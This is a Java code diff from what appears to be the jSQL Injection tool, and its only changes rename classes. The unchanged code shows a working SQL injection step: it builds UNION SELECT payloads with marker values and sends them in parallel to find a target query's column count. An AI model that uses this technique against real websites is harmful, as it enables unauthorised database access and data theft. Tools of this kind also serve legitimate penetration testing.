@@ -15,12 +15,12 @@ import com.jsql.view.GUIMediator;
  * Runnable class, search the correct number of fields in the SQL query.
  * Parallelizes the search, provides the stop capability
  */
-public class StoppableGetInitialQuery extends Suspendable {
+public class StoppableGetInitialQuery extends AbstractSuspendable {
     @Override
     public String action(Object... args) throws PreparationException, StoppableException {
         // Parallelize the search
         ExecutorService taskExecutor = Executors.newCachedThreadPool();
-        CompletionService<SimpleCallable> taskCompletionService = new ExecutorCompletionService<SimpleCallable>(taskExecutor);
+        CompletionService<SourceCodeCallable> taskCompletionService = new ExecutorCompletionService<SourceCodeCallable>(taskExecutor);
 
         boolean requestFound = false;
         String selectFields, initialQuery = "";
@@ -30,7 +30,7 @@ public class StoppableGetInitialQuery extends Suspendable {
         // Search if the source contains 1337[index]7331, this notation allows to exclude
         // pages that display our own url in the source
         for (selectIndex = 1, selectFields = "133717330%2b1"; selectIndex <= 10; selectIndex++, selectFields += ",1337" + selectIndex + "7330%2b1") {
-            taskCompletionService.submit(new SimpleCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
+            taskCompletionService.submit(new SourceCodeCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
         }
 
         int total = 10;
@@ -43,7 +43,7 @@ public class StoppableGetInitialQuery extends Suspendable {
                     throw new StoppableException();
                 }
 
-                SimpleCallable currentCallable = taskCompletionService.take().get();
+                SourceCodeCallable currentCallable = taskCompletionService.take().get();
 
                 // Found a correct mark 1337[index]7331 in the source
                 if (Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()) {
@@ -54,7 +54,7 @@ public class StoppableGetInitialQuery extends Suspendable {
                 } else {
                     selectIndex++;
                     selectFields += ",1337" + selectIndex + "7330%2b1";
-                    taskCompletionService.submit(new SimpleCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
+                    taskCompletionService.submit(new SourceCodeCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
                     total++;
                 }
             }
